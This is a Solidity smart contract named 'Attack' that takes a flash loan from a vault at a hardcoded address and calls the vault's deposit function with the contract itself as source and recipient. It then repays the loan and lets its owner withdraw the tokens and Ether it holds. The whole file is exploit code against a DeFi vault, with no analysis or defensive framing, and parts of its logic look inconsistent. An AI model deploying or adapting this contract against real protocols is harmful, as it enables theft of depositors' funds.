// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "IFlashBorrower.sol";
import "IDegen.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

interface Wirex {
     function approve(address spender, uint256 amount) external;
     function balanceOf (address account) external returns (uint256);
}

interface Vault {
    function deposit(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable;
}

contract Attack is IFlashBorrower {
    using SafeMath for uint256;

    address public immutable vaultContractAddress = 0x7195d3A344106b877F8D5f62CA570Fd25D43D180;
    address private owner;
    address public wirexContractAddress = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;

    constructor() {
        owner = msg.sender;
    }


    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    function aprobar () public {
    Wirex wirex = Wirex(wirexContractAddress);
    wirex.approve(address(this), 1000000000000000000000);
    wirex.approve(vaultContractAddress, 1000000000000000000000);
    }

    function attack() public {
        Vault vault = Vault(vaultContractAddress);
        Wirex wirex = Wirex(wirexContractAddress);
        aprobar();
        vault.deposit{value: 0 ether}(wirexContractAddress,
        address(this), address(this),
        wirex.balanceOf(address(this)), 0);
    }


    function onFlashLoan(
    address sender,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
   ) external override {
    console.log("borrowed amount:", amount);
    console.log("flashloan fee: ", fee);

    attack();

    // Retornar el préstamo
    IERC20(token).transfer(vaultContractAddress, amount.add(fee)); // Se incluye la tarifa al devolver el préstamo
    }


    function flashLoan(
        address receiver,
        IERC20 token,
        uint256 amount,
        bytes calldata data
    ) external {
        IDegen(vaultContractAddress).flashLoan(
            IFlashBorrower(address(this)),
            receiver,
            token,
            amount,
            data
        );
    }

    function withdrawTokens(IERC20[] memory tokens, uint256[] memory amounts) external onlyOwner {
        require(tokens.length == amounts.length, "Token and amount arrays must have the same length");

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 balance = tokens[i].balanceOf(address(this));
            require(balance >= amounts[i], "Insufficient token balance");

            tokens[i].transfer(msg.sender, amounts[i]);
        }
    }

    function withdrawEther(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient Ether balance");
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {
        // Esta función permite que el contrato reciba Ether cuando se le envía directamente.
    }
}
